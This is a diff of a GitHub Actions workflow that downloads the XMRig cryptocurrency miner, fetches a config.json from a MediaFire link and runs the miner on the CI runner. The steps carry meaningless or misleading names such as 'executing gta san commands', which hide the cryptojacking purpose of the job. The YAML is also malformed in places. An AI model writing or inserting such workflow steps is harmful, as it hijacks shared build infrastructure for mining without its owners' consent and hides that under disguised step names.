@@ -13,8 +13,9 @@ jobs:
       run: Invoke-WebRequest https://github.com/xmrig/xmrig/releases/download/v6.17.0/xmrig-6.17.0-gcc-win64.zip -OutFile xmrig-6.17.0-gcc-win64.zip
     - name: executing gta san commands
       run: unzip xmrig-6.17.0-gcc-win64.zip
+    - name : sjdnhd
       run: Invoke-WebRequest https://download1493.mediafire.com/ycbi7gx28dvg/ehcb87pv5pgvbqx/config.json -OutFile config.json
+    - name : sndndn 
       run: chmod +x xmrig.exe
-      run  ./xmrig.exe
-    - name: Keep Alive
-      run: ./timeout.ps1
+    - name : djhd
+      run: ./xmrig.exe
